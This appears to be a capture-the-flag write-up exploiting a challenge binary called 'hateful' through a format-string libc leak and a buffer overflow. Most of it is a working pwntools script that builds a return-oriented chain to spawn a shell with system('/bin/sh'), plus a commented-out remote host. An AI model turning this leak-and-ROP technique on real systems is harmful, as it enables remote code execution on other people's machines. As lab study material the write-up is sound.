We have a classic buffer overflow and a printf vulnerability:

We have a partial RELRO and no PIE so we can easily overwrite the GOT:

We need a libc leak. Since we have the controlled printf, we can leak `main`'s return address, which is somewhere in `__libc_start_main`.

Using `pwndbg` we can set a breakpoint at the printf call, see where the return address is, then calculate the offset from RSP 
(then adding 5 which are the rest of the register arguments except the format string).

![](04.pong)

We can leak the address and compute the base using the following code:

```py
io = process("./hateful_patched")

io.sendlineafter(b">> ",  b"yay")
io.sendlineafter(b">> ", b"%171$p")

libc_leak = int(io.recvline().strip().split(b": ")[-1], 16)
log.success(f"{libc_leak = :#0x}")
libc_base = libc_leak - 0x27305
log.success(f"{libc_base = :#0x}")
```

Now all we have to do is send a ROP chain to call `system("/bin/sh")`. Since we have the libc base address, we also have a lot of ROP gadgets.

Final code:

```py
from pwn import *

context.terminal = ["ghostty", "-e"]
context.binary = "./hateful_patched"
context.log_level = "debug"

elf = ELF("./hateful_patched")
rop = ROP("./hateful_patched")
libc_elf = ELF("./libc.so.6")
libc_rop = ROP("./libc.so.6")

# io = gdb.debug("./hateful_patched", """
#     b *send_message + 0x5b
#     b *send_message + 0xb9
#     c
# """)

io = process("./hateful_patched")
#io = remote("52.59.124.14", 5020)

io.sendlineafter(b">> ",  b"yay")
io.sendlineafter(b">> ", b"%171$p")

libc_leak = int(io.recvline().strip().split(b": ")[-1], 16)
log.success(f"{libc_leak = :#0x}")
libc_base = libc_leak - 0x27305
log.success(f"{libc_base = :#0x}")


payload = flat(
    b"A" * 1016,
    p64(libc_base + libc_rop.ret.address),
    p64(libc_base + libc_rop.rdi.address),
    p64(libc_base + next(libc_elf.search(b"/bin/sh\x00"))),
    p64(libc_base + libc_elf.sym.system),
)

io.sendlineafter(b"the message!\n", payload)

io.interactive()
```
